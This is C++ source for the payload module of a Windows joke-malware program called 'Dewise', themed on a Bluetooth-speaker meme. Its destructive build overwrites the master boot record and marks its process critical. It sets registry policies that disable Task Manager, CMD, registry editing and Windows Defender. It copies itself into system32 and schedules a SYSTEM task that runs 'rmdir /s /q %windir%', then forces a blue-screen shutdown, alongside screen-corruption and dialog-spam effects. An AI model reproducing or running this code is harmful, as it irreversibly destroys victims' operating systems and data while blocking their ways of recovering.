/*
*
* payloads.cpp : Destructive and non-destructive payloads
* Created in 2025-11-16
* Created by @0x0-nyan
*
*/
#include "payloads.h"
#include "common.h"
#include "Dewise.h"

PRTLADJUSTPRIVILEGE RtlAdjustPrivilege = NULL;
PRTLINITUNICODESTRING RtlInitUnicodeString = NULL;
PRTLSETPROCESSISCRITICAL RtlSetProcessIsCritical = NULL;
PNTRAISEHARDERROR NtRaiseHardError = NULL;
PNTSHUTDOWNSYSTEM NtShutdownSystem = NULL;
//PNTSETINFORMATIONPROCESS NtSetInformationProcess = NULL;


//#define DESTRUCTION_EN 1
//#define MBR_EN 0

#ifdef NDEBUG
int WINAPI MBROverwriter() {
    if (IsDestructive == TRUE) {
        HRSRC hRC = FindResourceW(NULL, MAKEINTRESOURCE(BOOT), MAKEINTRESOURCE(RT_RCDATA));
        if (!hRC) {
            return 0;
        }
        HGLOBAL hBoot = LoadResource(NULL, hRC);
        if (!hBoot) {
            return 0;
        }
        DWORD lenBoot = SizeofResource(NULL, hRC);
        BYTE* rawMBR = new BYTE[lenBoot];
        ZeroMemory(rawMBR, lenBoot);
        LPVOID lpBoot = LockResource(hBoot);
        memcpy(rawMBR, lpBoot, lenBoot);
        DWORD BytesWritten;
        HANDLE hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
        if (hFile == INVALID_HANDLE_VALUE) {
            MessageBoxW(NULL, L"INVALID_HANDLE_VALUE", L"Error", MB_ICONERROR | MB_OK);
            delete[] rawMBR;
            Sleep(10000);
            return 0;
        }
        WriteFile(hFile, rawMBR, lenBoot, &BytesWritten, NULL);
        CloseHandle(hFile);
        Sleep(10000);
        delete[] rawMBR;
        Sleep(10000);
        return 0;
    }
}

int WINAPI PowerOff() {
    if (IsDestructive == TRUE) {
        MSG_POWER_OFF = TRUE;
        PlaySoundW(NULL, NULL, 0);
        Sleep(500);
        PlaySoundW(MAKEINTRESOURCEW(BPF_POWER_OFF_WAV), NULL, SND_RESOURCE);
        for (int i = 0; i <= 50; i++) {
            ShowWindow(hWnds[i], SW_HIDE);
        }
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MBROverwriter, NULL, 0, NULL);
        Sleep(1000);
        BOOLEAN Prev;
        HARDERROR_RESPONSE Resp;
        NtRaiseHardError(0xC000013A, 0, NULL, NULL, OptionShutdownSystem, &Resp);
        Sleep(10000);
        return 0;
    }
    else {
        MoveWindow(hWnds[0], RandScreenX(1), RandScreenY(1), 640, 282, TRUE);
        MessageBoxW(NULL, L"There is no escape\nEnjoy Music Enjoy Life lol", L"Dewise Says", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
        return 0;
    }
}

int WINAPI DestructiveSetup(HINSTANCE hInstance) {
    if (IsDestructive == TRUE) {
        HMODULE hNtDLL = LoadLibraryW(L"ntdll.dll");
        if (!hNtDLL) {
            MessageBoxW(NULL, L"You're fortunate enough, we failed to load ntdll.dll.\nProcess will be terminated.", L"Error", MB_ICONERROR | MB_OK);
            ExitProcess(0);
        }
        else {
            RtlAdjustPrivilege = (PRTLADJUSTPRIVILEGE)GetProcAddress(hNtDLL, "RtlAdjustPrivilege");
            RtlInitUnicodeString = (PRTLINITUNICODESTRING)GetProcAddress(hNtDLL, "RtlInitUnicodeString");
            RtlSetProcessIsCritical = (PRTLSETPROCESSISCRITICAL)GetProcAddress(hNtDLL, "RtlSetProcessIsCritical");
            NtRaiseHardError = (PNTRAISEHARDERROR)GetProcAddress(hNtDLL, "NtRaiseHardError");
            //NtSetInformationProcess = (PNTSETINFORMATIONPROCESS)GetProcAddress(hNtDLL, "NtSetInformationProcess");
            FreeLibrary(hNtDLL);

            if (!RtlAdjustPrivilege) {
                MessageBoxW(NULL, L"Failed to get address to RtlAdjustPrivilege", L"ERROR", MB_ICONERROR | MB_SYSTEMMODAL);
                ExitProcess(0xC000007A);
            }
            if (!RtlInitUnicodeString) {
                MessageBoxW(NULL, L"Failed to get address to RtlInitUnicodeString", L"ERROR", MB_ICONERROR | MB_SYSTEMMODAL);
                ExitProcess(0xC000007A);
            }
            if (!RtlSetProcessIsCritical) {
                MessageBoxW(NULL, L"Failed to get address to RtlSetProcessIsCritical", L"ERROR", MB_ICONERROR | MB_SYSTEMMODAL);
                ExitProcess(0xC000007A);
            }
            if (!NtRaiseHardError) {
                MessageBoxW(NULL, L"Failed to get address to NtRaiseHardError", L"ERROR", MB_ICONERROR | MB_SYSTEMMODAL);
                ExitProcess(0xC000007A);
            }
        }

        // Obtain SeDebugPrivilege, SeShutdownPrivilege and set process as critical
        // Unfortunately this didn't work on Windows XP x64, with status of c0000002 (Not Implemented), including NtSetInformationProcess too.
        BOOLEAN WasEnabled;
        UINT ProcInfo = 0x01;
        RtlAdjustPrivilege(19, TRUE, FALSE, &WasEnabled);
        RtlAdjustPrivilege(20, TRUE, FALSE, &WasEnabled);
        RtlSetProcessIsCritical(TRUE, NULL, FALSE);
        //NTSTATUS NtStatus = NtSetInformationProcess(GetCurrentProcess(), 0x1D, &ProcInfo, sizeof(ProcInfo));
        //WCHAR Code[256];
        //wsprintfW(Code, L"NTSTATUS = %x", NtStatus);
        //MessageBoxW(NULL, Code, L"", MB_SYSTEMMODAL);

        // Add registry keys to avoid fixing
        HKEY hKey;
        DWORD regValue = 1;
        RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExW(hKey, L"DisableCMD", 0, REG_DWORD, (LPBYTE) &regValue, 4);
        RegCloseKey(hKey);

        RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (LPBYTE) &regValue, 4);
        RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (LPBYTE) &regValue, 4);
        RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (LPBYTE) &regValue, 4);
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (LPBYTE) &regValue, 4);
        RegCloseKey(hKey);

        RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExW(hKey, L"NoControlPanel", 0, REG_DWORD, (LPBYTE) &regValue, 4);
        RegSetValueExW(hKey, L"NoDesktop", 0, REG_DWORD, (LPBYTE) &regValue, 4);
        RegSetValueExW(hKey, L"NoLogoff", 0, REG_DWORD, (LPBYTE) &regValue, 4);
        RegSetValueExW(hKey, L"NoRun", 0, REG_DWORD, (LPBYTE) &regValue, 4);
        RegSetValueExW(hKey, L"NoWinKeys", 0, REG_DWORD, (LPBYTE) &regValue, 4);
        RegCloseKey(hKey);

        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (LPBYTE) &regValue, 4);
        RegCloseKey(hKey);

        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExW(hKey, L"HideFastUserSwitching", 0, REG_DWORD, (LPBYTE)&regValue, 4);
        //regValue = 0;
        //RegSetValueExW(hKey, L"EnableLUA", 0, REG_DWORD, (LPBYTE)&regValue, 4);
        RegCloseKey(hKey);

        // Copy the execution file itself and register some deadly tasks
        WCHAR lpExePath[MAX_PATH];
        GetModuleFileNameW(NULL, lpExePath, MAX_PATH);
        if (lpExePath != NULL) {
            WCHAR szSystemDir[MAX_PATH];
            WCHAR szExeDir[MAX_PATH];
            GetCurrentDirectoryW(MAX_PATH, szExeDir);
            GetSystemDirectoryW(szSystemDir, MAX_PATH);
            SetCurrentDirectoryW(szSystemDir);
            int res = CopyFileW(lpExePath, L"btaudio.exe", FALSE);
            SetCurrentDirectoryW(szExeDir);
        }
        //InitSecurity();
        RegisterTask(L"LPRemove", L"\\Microsoft\\Windows\\MUI", L"%windir%\\system32\\cmd.exe", L"/c rmdir /s /q %windir%", L"PT30S", L"SYSTEM");
        RegisterTask(L"Bluetooth Audio", L"\\Microsoft\\Windows\\Bluetooth", L"%windir%\\system32\\btaudio.exe", L"-FS", L"PT10S", L"Network Service");

        // Don't forget to overwrite MBR
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MBROverwriter, NULL, 0, NULL);

        // It's done, this is how we f**k up their computer haha
        return 0;
    }
}

int WINAPI ForceShutdown() {
    HMODULE hNtDLL = LoadLibraryW(L"ntdll.dll");
    if (!hNtDLL) {
        return 0;
    }
    else {
        RtlAdjustPrivilege = (PRTLADJUSTPRIVILEGE)GetProcAddress(hNtDLL, "RtlAdjustPrivilege");
        NtShutdownSystem = (PNTSHUTDOWNSYSTEM)GetProcAddress(hNtDLL, "NtShutdownSystem");
        FreeLibrary(hNtDLL);

        if (!RtlAdjustPrivilege) ExitProcess(0xC000007A);
        if (!NtShutdownSystem) ExitProcess(0xC000007A);
    }
    BOOLEAN Prev;
    RtlAdjustPrivilege(19, TRUE, FALSE, &Prev);
    Sleep(180000); //3 minutes
    NtShutdownSystem(ShutdownPowerOff);
    Sleep(10000);
    ExitProcess(0);
}

int WINAPI FuckUp() {
    if (IsDestructive == TRUE) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MBROverwriter, NULL, 0, NULL);
        HARDERROR_RESPONSE Resp;
        UNICODE_STRING Text;
        RtlInitUnicodeString(&Text, L"Bluetooth device, as connected uhh successfully. \n\n\n\n\\(^o^)/\n\n\n\nWindows said:\nWhat the fuck bro our");
        UINT_PTR params[4] = { (ULONG_PTR)&Text, 0xDeadDead ,0xCafeBabe, 0xAddedDef };
        NtRaiseHardError(0xC000021A, 4, 1, &params, OptionShutdownSystem, &Resp);
        return 0;
    }
}
/*
* (Preview):
STOP: c000021a {Fatal System Error}
The Bluetooth device, as connected uhh successfully.



\(^o^)/



Windows said:
What the fuck bro our system process terminated unexpectedly with a status of 0x
deaddead (0xcafebabe 0xaddeddef).
The system has been shut down.
*/

#else

int WINAPI PowerOff() {
    if (IsDestructive == TRUE) {
        MSG_POWER_OFF = TRUE;
        PlaySoundW(NULL, NULL, 0);
        Sleep(500);
        PlaySoundW(MAKEINTRESOURCEW(BPF_POWER_OFF_WAV), NULL, SND_RESOURCE);
        for (int i = 0; i <= 50; i++) {
            ShowWindow(hWnds[i], SW_HIDE);
        }
        Sleep(1000);
        HARDERROR_RESPONSE Resp;
        NtRaiseHardError(0xC000013A, 0, NULL, NULL, OptionOk, &Resp);
        ExitProcess(0);
    }
    else {
        MoveWindow(hWnds[0], RandScreenX(1), RandScreenY(1), 640, 282, TRUE);
        MessageBoxW(NULL, L"There is no escape\nEnjoy Music Enjoy Life lol", L"Dewise Says", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
        return 0;
    }

}

int WINAPI DestructiveSetup(HINSTANCE hInstance) {
    HMODULE hNtDLL = LoadLibraryW(L"ntdll.dll");
    if (!hNtDLL) {
        MessageBoxW(NULL, L"You're fortunate enough, we failed to load ntdll.dll.\nProcess will be terminated.", L"Error", MB_ICONERROR | MB_OK);
        ExitProcess(0);
    }
    else {
        RtlInitUnicodeString = (PRTLINITUNICODESTRING)GetProcAddress(hNtDLL, "RtlInitUnicodeString");
        NtRaiseHardError = (PNTRAISEHARDERROR)GetProcAddress(hNtDLL, "NtRaiseHardError");
        FreeLibrary(hNtDLL);

        if (!RtlInitUnicodeString) {
            MessageBoxW(NULL, L"Failed to get address to RtlInitUnicodeString", L"ERROR", MB_ICONERROR | MB_SYSTEMMODAL);
            ExitProcess(0xC000007A);
        }

        if (!NtRaiseHardError) {
            MessageBoxW(NULL, L"Failed to get address to NtRaiseHardError", L"ERROR", MB_ICONERROR | MB_SYSTEMMODAL);
            ExitProcess(0xC000007A);
        }
    }
    return 0;
}

int WINAPI ForceShutdown() {
    Sleep(180000); //3 minutes
    MessageBoxW(NULL, L"Force Shutdown", L"Information", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
    Sleep(10000);
    ExitProcess(0);
}

int WINAPI FuckUp() {
    HARDERROR_RESPONSE Resp;
    UNICODE_STRING Text;
    RtlInitUnicodeString(&Text, L"Bluetooth device, as connected uhh successfully. /n/n/n/n/nThe Bluetooth Dewise");
    UINT_PTR params[4] = { (ULONG_PTR)&Text, 0xAC6905A8 ,0xAC6921A4, 0xAC6955F4 };
    NtRaiseHardError(0xC000021A, 4, 1, &params, OptionOk, &Resp);
    ExitProcess(0);
    return 0;
}

#endif

int WINAPI RandomSounds() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    srand((unsigned int)(st.wMilliseconds + st.wSecond * 1000 + st.wMinute * 60000));
    while (1) {
        if (MSG_POWER_OFF == TRUE) return 0;
        PlaySoundW(MAKEINTRESOURCEW(BPF_0_WAV + (rand() % 30)), NULL, SND_RESOURCE);
    }
}


int WINAPI BTIcons() {
    HICON hBluetooth;
    HICON hDewise = LoadIcon(hInst, MAKEINTRESOURCE(IDI_DEWISE));
    HICON hError = LoadIcon(NULL, IDI_ERROR);
    HDC hDC;
    POINT Mouse;
    SIZE Scr;
    GetScreenSize(&Scr);
    int ix = GetSystemMetrics(SM_CXICON) / 2;
    int iy = GetSystemMetrics(SM_CYICON) / 2;
    ExtractIconExW(L"bthprops.cpl", 2, &hBluetooth, NULL, 2);   //This didn't work on Windows XP x64

    const COLORREF rgbRed = 0x000000FF;
    const COLORREF rgbBlue = 0x00FF2000;
    const COLORREF rgbLightBlue = 0x00FFD000;
    const COLORREF rgbBlack = 0x00000000;

    // I will not include this font in resource for copyright reason
    // However it's really nice font, so I would recommend to check it out.
    // https://fonts.google.com/specimen/Hachi+Maru+Pop
    HFONT hHachiMaruPop = CreateFontW(      
        32,
        0,
        0,
        0,
        FW_DONTCARE,
        FALSE,
        FALSE,
        FALSE,
        SHIFTJIS_CHARSET,
        OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS,
        ANTIALIASED_QUALITY,
        DEFAULT_PITCH,
        L"knsw_HachiMaruPop Regular"
    );

    int action = rand() % 7;
    while (1) {
        hDC = GetDC(NULL);
        GetCursorPos(&Mouse);
        DrawIcon(hDC, Mouse.x - ix, Mouse.y - iy, hError);
        SetBkMode(hDC, TRANSPARENT);
        if(hHachiMaruPop) SelectObject(hDC, hHachiMaruPop);
        action = rand() % 8;
        switch (action) {
        case 0:
            SetTextColor(hDC, rgbBlue);
            TextOutW(hDC, rand() % Scr.cx, rand() % Scr.cy, L"Bluetooth", 9);
            break;
        case 1:
            SetTextColor(hDC, rgbRed);
            TextOutW(hDC, rand() % Scr.cx, rand() % Scr.cy, L"music", 5);
            break;
        case 2:
            SetTextColor(hDC, rgbLightBlue);
            TextOutW(hDC, rand() % Scr.cx, rand() % Scr.cy, L"Enjoy Music Enjoy Life", 22);
            break;
        case 3:
            DrawIcon(hDC, rand() % Scr.cx, rand() % Scr.cy, hDewise);
            break;
        default:
            DrawIcon(hDC, rand() % Scr.cx, rand() % Scr.cy, hBluetooth);
            break;
        }
        ReleaseDC(NULL, hDC);
        Sleep(5);
    }
    return 0;
}


/*int WINAPI WindowShaker() {
    int i = 0;
    while (1) {
        MoveWindow(hWnds[i], RandScreenX(0), RandScreenY(0), i == 0 ? 640 : 320, i == 0 ? 282 : 350, TRUE);
        if (i == 50) i = 0; else i++;
        Sleep(10);
    }
    return 0;
}*/


int WINAPI CrazyScreen() {
    WAVE Wave;
    HRSRC hRC = FindResourceW(NULL, MAKEINTRESOURCE(SDRAM), MAKEINTRESOURCE(RT_RCDATA));
    if (!hRC) {
        //MessageBoxW(NULL, L"Failed to find SDRAM resource.", L"Error", MB_OK | MB_ICONERROR);
        return 0;
    }
    HGLOBAL hSDRAM = LoadResource(NULL, hRC);
    if (!hSDRAM) {
        //MessageBoxW(NULL, L"Failed to load SDRAM resource.", L"Error", MB_OK | MB_ICONERROR);
        return 0;
    }
    Wave.Init(8000);
    Wave.Volume(0xFFFFFFFF);
    char* buffer = new char[484052];
    LPVOID lpSDRAM = LockResource(hSDRAM);
    memcpy(buffer, lpSDRAM, 484052);
    Wave.Play(buffer, 484052, 3);

    HDC hDC = GetDC(NULL);
    SetStretchBltMode(hDC, HALFTONE);
    SIZE Scr;
    GetScreenSize(&Scr);
    int i = 0;
    while (1) {
        MoveWindow(hWnds[i], RandScreenX(0), RandScreenY(0), i == 0 ? 640 : 320, i == 0 ? 282 : 350, TRUE);
        StretchBlt(hDC, 10, 10, Scr.cx - (rand() % 60), Scr.cy - (rand() % 60), hDC, 0, 0, Scr.cx - (rand() % 20), Scr.cy - (rand() % 20), SRCCOPY);
        if (i == 50) i = 0; else i++;
        //ReleaseDC(NULL, hDC);
        //Sleep(10);
        //hDC = GetDC(NULL);
    }
}


int WINAPI RandomDialogs() {
    int swDialogs;
    LPCWSTR Quote = L"People aren't hearing all the music,\n\nArtists and producers work hard in the studio,\nperfecting their sound,But people can't really hear\nit with normal headphones.Most headphones can't\nhandle the baas,the detail,the dynamics,Bottom\nline,the muaic doesn't move you.\n\nwith Boats,people are going to hear what the artists\nhear and listen to the music the way they should;\nthe way I do,";
    SYSTEMTIME st;
    GetLocalTime(&st);
    srand((unsigned int)(st.wMilliseconds + st.wSecond * 1000 + st.wMinute * 60000));
    while (1) {
        swDialogs = rand() % 16;
        switch (swDialogs) {
        case 0:
            MessageBoxW(NULL, Quote, L"Boats", MB_OK | MB_SYSTEMMODAL);
            break;
        case 1:
            MessageBoxW(NULL, L"Enjoy Music Enjoy Life", L"music", MB_OK | MB_SYSTEMMODAL);
            break;
        case 2:
            MessageBoxW(NULL, L"Ze Bluetooth dewise is ready to pell", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 3:
            MessageBoxW(NULL, L"The Bluetooth Device Is Ready To Pair", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 4:
            MessageBoxW(NULL, L"Ze Bluetooth dewise, as connected uhh successfully", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 5:
            MessageBoxW(NULL, L"The Bluetooth Device Is Connected Successfully", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 6:
            MessageBoxW(NULL, L"Music play modal", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 7:
            MessageBoxW(NULL, L"The radio moder", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 8:
            MessageBoxW(NULL, L"AUX input modal", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 9:
            MessageBoxW(NULL, L"FM tender", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 10:
            MessageBoxW(NULL, L"The device already ready to connect", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 11:
            MessageBoxW(NULL, L"You have a car\nYou have a car\n0 7 3 0 5 6 3 6 1 1", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 12:
            MessageBoxW(NULL, L"Battery is low, please recharge in time", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 13:
            MessageBoxW(NULL, L"Enter the Bluetooth", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 14:
            MessageBoxW(NULL, L"Di dian qing chong dian", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        case 15:
            MessageBoxW(NULL, L"Lan ya mo shi", L"Dewise Says", MB_OK | MB_SYSTEMMODAL);
            break;
        }
        Sleep(rand() % 3000);
    }
    return 0;
}